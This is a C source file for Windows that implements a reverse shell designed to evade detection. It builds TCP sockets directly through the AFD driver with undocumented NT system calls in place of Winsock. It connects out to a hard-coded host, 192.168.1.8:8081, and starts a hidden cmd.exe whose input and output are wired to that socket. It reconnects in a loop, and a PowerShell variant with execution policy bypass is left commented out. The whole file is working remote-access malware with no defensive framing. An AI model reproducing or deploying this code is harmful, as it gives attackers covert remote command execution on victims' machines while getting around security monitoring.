#include <Windows.h>
#include "HostileHeader.h"

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* destination, int value, size_t size)
{
    // logic similar to memset's one
    unsigned char* p = (unsigned char*)destination;
    while (size > 0) {
        *p = (unsigned char)value;
        p++;
        size--;
    }
    return destination;
}

extern void* __cdecl memcpy(void*, const void*, size_t);
#pragma intrinsic(memcpy)
#pragma function(memcpy)

void* __cdecl memcpy(void* destination, const void* source, size_t size)
{
    unsigned char* dst = (unsigned char*)destination;
    const unsigned char* src = (const unsigned char*)source;

    while (size > 0)
    {
        *dst = *src;
        dst++;
        src++;
        size--;
    }
    return destination;
}

typedef signed char         int8_t;
typedef short               int16_t;
typedef int                 int32_t;
typedef long long           int64_t;
typedef unsigned char       uint8_t;
typedef unsigned short      uint16_t;
typedef unsigned int        uint32_t;
typedef unsigned long long  uint64_t;
typedef unsigned char       u_char;
typedef unsigned short      u_short;
typedef unsigned int        u_int;
typedef unsigned long       u_long;


#define AF_INET                             2               
#define SOCK_STREAM                         1             
#define IPPROTO_TCP                         6          
#define FILE_SHARE_READ                     0x00000001  
#define FILE_SHARE_WRITE                    0x00000002  


#define AFD_ENDPOINT_FLAG_CONNECTIONLESS    0x000000000001
#define AFD_ENDPOINT_FLAG_MESSAGEMODE       0x000000000010
#define AFD_ENDPOINT_FLAG_RAW               0x000000001000
#define AFD_ENDPOINT_FLAG_MULTIPOINT        0x000000010000
#define AFD_ENDPOINT_FLAG_CROOT             0x000001000000
#define AFD_ENDPOINT_FLAG_DROOT             0x000010000000
#define AFD_ENDPOINT_FLAG_IGNORETDI         0x001000000000
#define AFD_ENDPOINT_FLAG_RIOSOCKET         0x010000000000


#define FILE_OPEN_IF                        0x00000003
#define FILE_SYNCHRONOUS_IO_NONALERT        0x00000020


#define STATUS_CONNECTION_REFUSED           0xC0000236
#define STATUS_PENDING                      0x00000103


#define METHOD_NEITHER                      3
#define FILE_DEVICE_NETWORK                 0x00000012

#define FSCTL_AFD_BASE                      FILE_DEVICE_NETWORK

#define _AFD_CONTROL_CODE(Operation,Method) \
  ((FSCTL_AFD_BASE)<<12 | (Operation<<2) | Method)

#define AFD_BIND            0
#define AFD_CONNECT         1

#define IOCTL_AFD_BIND \
  _AFD_CONTROL_CODE(AFD_BIND, METHOD_NEITHER)
#define IOCTL_AFD_CONNECT \
  _AFD_CONTROL_CODE(AFD_CONNECT, METHOD_NEITHER)

#define AFD_NORMALADDRUSE                   0

typedef struct _AFD_OPEN_PACKET_EA
{
    uint32_t nextEntryOffset;
    uint8_t flags;
    uint8_t eaNameLength;
    uint16_t eaValueLength;
    char eaName[0x10];
    uint32_t endpointFlags;
    uint32_t groupID;
    uint32_t addressFamily;
    uint32_t socketType;
    uint32_t protocol;
    uint32_t sizeOfTransportName;
    uint8_t unknownBytes[0x9];
} AFD_OPEN_PACKET_EA;

typedef struct _AFD_BIND_SOCKET
{
    uint32_t flags;
    SOCKADDR address;
} AFD_BIND_SOCKET;

typedef struct _AFD_CONNECT_SOCKET
{
    uint64_t sanActive;
    uint64_t rootEndpoint;
    uint64_t connectEndpoint;
    SOCKADDR address;
} AFD_CONNECT_SOCKET;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateFileLoc(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
    _In_ ULONG EaLength
);typedef NtCreateFileLoc* PNtCreateFileLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeviceIoControlFileLoc(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength
);typedef NtDeviceIoControlFileLoc* PNtDeviceIoControlFileLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtWaitForSingleObjectLoc(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout
); typedef NtWaitForSingleObjectLoc* PNtWaitForSingleObjectLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtFreeVirtualMemoryLoc(
    _In_ HANDLE ProcessHandle,
    _Inout_ __drv_freesMem(Mem) PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType
); typedef NtFreeVirtualMemoryLoc* PNtFreeVirtualMemoryLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtWriteFileLoc(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key
); typedef NtWriteFileLoc* PNtWriteFileLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtReadFileLoc(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key
); typedef NtReadFileLoc* PNtReadFileLoc;

typedef NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParametersExLoc(
    _Out_ PRTL_USER_PROCESS_PARAMETERS* ProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags
); typedef RtlCreateProcessParametersExLoc* PRtlCreateProcessParametersExLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateUserProcessLoc(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
    _In_ ULONG ProcessFlags,
    _In_ ULONG ThreadFlags,
    _In_opt_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    _Inout_ PPS_CREATE_INFO CreateInfo,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
); typedef NtCreateUserProcessLoc* PNtCreateUserProcessLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtResumeThreadLoc(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount
); typedef NtResumeThreadLoc* PNtResumeThreadLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtDuplicateObjectLoc(
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _In_opt_ HANDLE TargetProcessHandle,
    _Out_opt_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
); typedef NtDuplicateObjectLoc* PNtDuplicateObjectLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtCloseLoc(
    _In_ _Post_ptr_invalid_ HANDLE Handle
); typedef NtCloseLoc* PNtCloseLoc;

typedef NTSYSCALLAPI
NTSTATUS
NTAPI
NtDelayExecutionLoc(
    _In_ BOOLEAN Alertable,
    _In_ PLARGE_INTEGER DelayInterval
); typedef NtDelayExecutionLoc* PNtDelayExecutionLoc;


#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\cmd.exe"
#define PROCESS_PARMS		L"cmd.exe /Q"
#define PROCESS_PATH		L"C:\\Windows\\System32"


//#define TARGET_PROCESS      L"\\??\\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
//#define PROCESS_PARMS       L"powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -NoExit"
//#define PROCESS_PATH        L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0"

__declspec(noinline) NTSTATUS CreateAfdSocket(PHANDLE socket)
{
    const char* eaName = "AfdOpenPacketXX";
    UNICODE_STRING devName;
    RtlInitUnicodeStringInline(&devName, L"\\Device\\Afd\\Endpoint");

    OBJECT_ATTRIBUTES object;
    memset(&object, 0, sizeof(OBJECT_ATTRIBUTES));
    object.ObjectName = &devName;
    object.Length = 48;
    object.Attributes = 0x40;

    AFD_OPEN_PACKET_EA afdOpenPacketEA;
    afdOpenPacketEA.nextEntryOffset = 0x00;
    afdOpenPacketEA.flags = 0x00;
    afdOpenPacketEA.eaNameLength = 0x0F;
    afdOpenPacketEA.eaValueLength = 0x1e;
    afdOpenPacketEA.endpointFlags = 0x00;
    afdOpenPacketEA.groupID = 0x00;
    afdOpenPacketEA.addressFamily = AF_INET;
    afdOpenPacketEA.socketType = SOCK_STREAM;
    afdOpenPacketEA.protocol = IPPROTO_TCP;
    afdOpenPacketEA.sizeOfTransportName = 0x00;
    memset(afdOpenPacketEA.eaName, 0x00, 0x10);
    memcpy(afdOpenPacketEA.eaName, eaName, 0x10);
    memset(afdOpenPacketEA.unknownBytes, 0xFF, 0x9);

    PNtCreateFileLoc p_nt_create = (PNtCreateFileLoc)GetProcedureAddressNt("NtCreateFile");

    IO_STATUS_BLOCK IoStatusBlock;
    return p_nt_create(socket, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &object,
        &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT, &afdOpenPacketEA,
        sizeof(afdOpenPacketEA));
}


__declspec(noinline) NTSTATUS BindAfdSocket(HANDLE socket)
{
    AFD_BIND_SOCKET afdBindSocket;
    memset(&afdBindSocket, 0, sizeof(AFD_BIND_SOCKET));
    afdBindSocket.flags = AFD_NORMALADDRUSE;
    afdBindSocket.address.sa_family = AF_INET;
    /* PORT == 27015 */
    //afdBindSocket.address.sa_data[0] = 0x69;
    //afdBindSocket.address.sa_data[1] = 0x87;

    afdBindSocket.address.sa_data[0] = 0x00;  // Port = 0 (auto)
    afdBindSocket.address.sa_data[1] = 0x00;

    /* ADDRESS == 127.0.0.1 */
    //afdBindSocket.address.sa_data[2] = 0x7F;
    //afdBindSocket.address.sa_data[3] = 0x00;
    //afdBindSocket.address.sa_data[4] = 0x00;
    //afdBindSocket.address.sa_data[5] = 0x01;

    /* ADDRESS = 0.0.0.0 (any interface) */
    afdBindSocket.address.sa_data[2] = 0x00;  // 0
    afdBindSocket.address.sa_data[3] = 0x00;  // 0
    afdBindSocket.address.sa_data[4] = 0x00;  // 0
    afdBindSocket.address.sa_data[5] = 0x00;  // 0

    uint8_t outputBuffer[0x10];

    IO_STATUS_BLOCK ioStatus;

    PNtDeviceIoControlFileLoc p_nt_control = (PNtDeviceIoControlFileLoc)GetProcedureAddressNt("NtDeviceIoControlFile\0");
    PNtWaitForSingleObjectLoc p_nt_wait = (PNtDeviceIoControlFileLoc)GetProcedureAddressNt("NtWaitForSingleObject\0");

    NTSTATUS status = p_nt_control(socket, NULL, NULL, NULL, &ioStatus, IOCTL_AFD_BIND,
        &afdBindSocket, sizeof(AFD_BIND_SOCKET),
        outputBuffer, 0x00000010);

    if (status == STATUS_PENDING) 
    {
        p_nt_wait(socket, FALSE, NULL);
        status = ioStatus.Status;
    }

    return status;
}

__declspec(noinline)  NTSTATUS ConnectAfdSocket(HANDLE socket)
{
    AFD_CONNECT_SOCKET afdConnectSocket;
    memset(&afdConnectSocket, 0, sizeof(AFD_CONNECT_SOCKET));
    afdConnectSocket.sanActive = 0x00;
    afdConnectSocket.rootEndpoint = 0x00;
    afdConnectSocket.connectEndpoint = 0x00;
    afdConnectSocket.address.sa_family = AF_INET;

    //8081
    afdConnectSocket.address.sa_data[0] = 0x1F;
    afdConnectSocket.address.sa_data[1] = 0x91;

    //127.0.0.1
    //afdConnectSocket.address.sa_data[2] = 0x7F;
    //afdConnectSocket.address.sa_data[3] = 0x00;
    //afdConnectSocket.address.sa_data[4] = 0x00;
    //afdConnectSocket.address.sa_data[5] = 0x01;

    afdConnectSocket.address.sa_data[2] = 192;
    afdConnectSocket.address.sa_data[3] = 168;
    afdConnectSocket.address.sa_data[4] = 1;
    afdConnectSocket.address.sa_data[5] = 8;

    PNtDeviceIoControlFileLoc p_nt_control = (PNtDeviceIoControlFileLoc)GetProcedureAddressNt("NtDeviceIoControlFile\0");
    PNtWaitForSingleObjectLoc p_nt_wait = (PNtDeviceIoControlFileLoc)GetProcedureAddressNt("NtWaitForSingleObject\0");

    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status = p_nt_control(socket, NULL, NULL, NULL, &ioStatus, IOCTL_AFD_CONNECT,
        &afdConnectSocket, sizeof(AFD_CONNECT_SOCKET),
        NULL, NULL);
    if (status == STATUS_PENDING) {
        p_nt_wait(socket, FALSE, NULL);
        status = ioStatus.Status;
    }
    return status;
}

__declspec(noinline) CHAR* WriteSimpleTextToConsole(CHAR* const buffer)
{
    HANDLE p_std_out = ((PPEB)__readgsqword(0x60))->ProcessParameters->StandardOutput;
    IO_STATUS_BLOCK io_status_Block;

    LARGE_INTEGER offset;
    offset.HighPart = -1;
    offset.LowPart = 0xffffffff;

    INT size = StringLengthA(buffer);

    PNtWriteFileLoc p_nt_write = (PNtWriteFileLoc)GetProcedureAddressNt("NtWriteFile\0");

    NTSTATUS n = p_nt_write(p_std_out,
        NULL,
        NULL,
        NULL,
        &io_status_Block,
        buffer,
        (ULONG)size,
        &offset,
        NULL);

    if (NT_SUCCESS(n))
        return buffer;
    return NULL;
}

__declspec(noinline) VOID CustomSprintf(char* buffer, const char* format, ...)
{
    void** ptr = (void**)&format + 1;
    while (*format)
    {
        if (*format == '%')
        {
            format++; 
            switch (*format)
            {
            case 'd':
            {
                int num = *((int*)ptr);
                ptr++;
                do
                {
                    *buffer++ = '0' + num % 10;
                    num /= 10;
                } while (num != 0);
                break;
            }
            case 'c':
            {
                char ch = *((char*)ptr);
                ptr++;
                *buffer++ = ch;
                break;
            }
            case 's':
            {
                char* str = *((char**)ptr);
                ptr++;
                while (*str)
                {
                    *buffer++ = *str++;
                }
                break;
            }
            case 'p':
            {
                void* addr = *ptr;
                ptr++;
                ULONG_PTR addr_val = (ULONG_PTR)addr;
                for (int i = sizeof(addr_val) * 2 - 1; i >= 0; i--)
                {
                    int digit = (addr_val >> (i * 4)) & 0xF;
                    if (digit < 10)
                        *buffer++ = '0' + digit;
                    else
                        *buffer++ = 'a' + digit - 10;
                }
                break;
            }
            default:
                break;
            }
        }
        else
        {
            *buffer++ = *format;
        }
        format++; 
    }
    *buffer = '\0';
}

__declspec(noinline) HANDLE NtCreateUserProcessForSubProc(HANDLE socket, PWSTR imagePath, PWSTR parameters, PWSTR curDir,IN HANDLE parentProcess, PHANDLE newProcess, PHANDLE newThread, CHAR* buffer_char)
{
    PRtlCreateProcessParametersExLoc pRtlCreateProcessParametersEx = (PRtlCreateProcessParametersExLoc)GetProcedureAddressNt("RtlCreateProcessParametersEx");
    PNtCreateUserProcessLoc pNtCreateUserProcess = (PNtCreateUserProcessLoc)GetProcedureAddressNt("NtCreateUserProcess");
    PNtFreeVirtualMemoryLoc p_nt_free = (PNtFreeVirtualMemoryLoc)GetProcedureAddressNt("NtFreeVirtualMemory");
    PNtDuplicateObjectLoc p_nt_dup = (PNtDuplicateObjectLoc)GetProcedureAddressNt("NtDuplicateObject");
    PNtCloseLoc p_nt_close = (PNtCloseLoc)GetProcedureAddressNt("NtClose");

    if (pNtCreateUserProcess == NULL || pRtlCreateProcessParametersEx == NULL)
        return FALSE;

    NTSTATUS STATUS = 0;
    UNICODE_STRING ntImagePath = { 0 }, commandLine = { 0 }, currentDirectory = { 0 };
    PRTL_USER_PROCESS_PARAMETERS UppProcessParameters = NULL;

    SIZE_T sizeOfAtt = sizeof(PS_ATTRIBUTE_LIST);
    PPS_ATTRIBUTE_LIST pAttributeList = (PPS_ATTRIBUTE_LIST)MallocCustom(&sizeOfAtt);
    if (!pAttributeList)
        return FALSE;

    RtlInitUnicodeStringInline(&ntImagePath, imagePath);
    RtlInitUnicodeStringInline(&commandLine, parameters);
    RtlInitUnicodeStringInline(&currentDirectory, curDir);

    HANDLE hInheritableSocket = 0;
    p_nt_dup(NtCurrentProcess(), socket, NtCurrentProcess(), &hInheritableSocket, 0, 2 , 3);

    WriteSimpleTextToConsole("[+] Inheritable socket handle created\n");

    STATUS = pRtlCreateProcessParametersEx(
        &UppProcessParameters,
        &ntImagePath,
        NULL,
        &currentDirectory,
        &commandLine,
        NULL, NULL, NULL, NULL, NULL,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (STATUS != STATUS_SUCCESS)
    {
        goto _EndOfFunc;
    }

    UppProcessParameters->StandardInput = hInheritableSocket;
    UppProcessParameters->StandardOutput = hInheritableSocket;
    UppProcessParameters->StandardError = hInheritableSocket;

    UppProcessParameters->ShowWindowFlags = 0x00000000; 
    UppProcessParameters->ConsoleFlags = 0x00000000;    
    UppProcessParameters->WindowFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    UppProcessParameters->ShowWindowFlags = SW_HIDE; 

    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    pAttributeList->Attributes[0].Attribute = 0x0000000000020005;  
    pAttributeList->Attributes[0].Size = ntImagePath.Length;
    pAttributeList->Attributes[0].Value = (ULONG_PTR)ntImagePath.Buffer;

    pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    pAttributeList->Attributes[1].Size = sizeof(HANDLE);
    pAttributeList->Attributes[1].Value = (ULONG_PTR)parentProcess;

    PS_CREATE_INFO psCreateInfo = { 0 };
    psCreateInfo.Size = sizeof(PS_CREATE_INFO);
    psCreateInfo.State = PsCreateInitialState;
    psCreateInfo.InitState.InitFlags = 0x20000003;
    psCreateInfo.InitState.AdditionalFileAccess = 0x00000081;

    STATUS = pNtCreateUserProcess(
        newProcess,
        newThread,
        0x02000000,     
        0x02000000,    
        NULL,          
        NULL,          
        0x204,        
        0x1,      
        UppProcessParameters,
        &psCreateInfo,
        pAttributeList
    );

    if (STATUS != STATUS_SUCCESS)
    {
        memset(buffer_char, '\0', 100);
        CustomSprintf(buffer_char, "[!] NtCreateUserProcess failed: 0x%08X\n", STATUS);
        WriteSimpleTextToConsole(buffer_char);
        p_nt_close(hInheritableSocket);
        goto _EndOfFunc;
    }

    memset(buffer_char, '\0', 100);
    CustomSprintf(buffer_char, "[-] NtCreateUserProcess: SUCCESS\n");
    WriteSimpleTextToConsole(buffer_char);

    PNtResumeThreadLoc p_resume_thread = (PNtResumeThreadLoc)GetProcedureAddressNt("NtResumeThread");
    if (p_resume_thread)
    {
        ULONG suspendCount = 0;
        STATUS = p_resume_thread(*newThread, &suspendCount);

        memset(buffer_char, '\0', 100);
        CustomSprintf(buffer_char, "[-] NtResumeThread: 0x%08X\n", STATUS);
        WriteSimpleTextToConsole(buffer_char);
    }

_EndOfFunc:
    if (pAttributeList)
    {
        p_nt_free(NtCurrentProcess(), (PVOID*)&pAttributeList, &sizeOfAtt, MEM_RELEASE);
    }

    return hInheritableSocket;
}

__declspec(noinline) VOID NtSleep(ULONG milliseconds)
{
    PNtDelayExecutionLoc p_nt_delay = (PNtDelayExecutionLoc)GetProcedureAddressNt("NtDelayExecution");
    LARGE_INTEGER interval;
    interval.QuadPart = -((LONGLONG)milliseconds * 10000LL);

    p_nt_delay(FALSE, &interval);

}
__declspec(noinline) VOID CloseSocketProperly(HANDLE socket)
{
    PNtCloseLoc p_nt_close = (PNtCloseLoc)GetProcedureAddressNt("NtClose");

    if (socket && socket != INVALID_HANDLE_VALUE)
    {
        p_nt_close(socket);
    }
}

int main(void)
{
    HANDLE socket = NULL;
    NTSTATUS status;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HANDLE hParentProcess = NtCurrentProcess();
    SIZE_T buff_size = 100;
    CHAR* buffer_char = (CHAR*)MallocCustom(&buff_size);

    while (1)
    {
        WriteSimpleTextToConsole("[*] Attempting connection...\n");

        status = CreateAfdSocket(&socket);
        if (!NT_SUCCESS(status))
        {
            NtSleep(5000);
            continue;
        }

        WriteSimpleTextToConsole("[+] Socket created!\n");

        // Bind
        status = BindAfdSocket(socket);
        if (!NT_SUCCESS(status))
        {
            CloseSocketProperly(socket);
            socket = NULL;
            NtSleep(5000);
            continue;
        }

        WriteSimpleTextToConsole("[+] Socket bound!\n");

        // Connect
        status = ConnectAfdSocket(socket);
        if (!NT_SUCCESS(status))
        {
            CloseSocketProperly(socket);
            socket = NULL;
            NtSleep(5000);
            continue;
        }

        WriteSimpleTextToConsole("[+] Connected!\n");

        HANDLE inheritableSocket = NtCreateUserProcessForSubProc(
            socket,
            TARGET_PROCESS,
            PROCESS_PARMS,
            PROCESS_PATH,
            hParentProcess,
            &hProcess,
            &hThread,
            buffer_char
        );

        if (!inheritableSocket)
        {
            WriteSimpleTextToConsole("[-] Failed to create process. Retrying...\n");
            NtSleep(5000);
            continue;
        }

        WriteSimpleTextToConsole("[+] Process created. Waiting for disconnection...\n");

        PNtWaitForSingleObjectLoc p_nt_wait =(PNtWaitForSingleObjectLoc)GetProcedureAddressNt("NtWaitForSingleObject");
        p_nt_wait(hProcess, FALSE, NULL);

        WriteSimpleTextToConsole("[-] Connection lost. Reconnecting...\n");
        PNtCloseLoc p_nt_close = (PNtCloseLoc)GetProcedureAddressNt("NtClose");

        if (hProcess)
            p_nt_close(hProcess);
        if (hThread)
            p_nt_close(hThread);

        hProcess = NULL;
        hThread = NULL;

        WriteSimpleTextToConsole("[*] Waiting 2 seconds before retry...\n");
        NtSleep(2000);
    }

    return 0;
}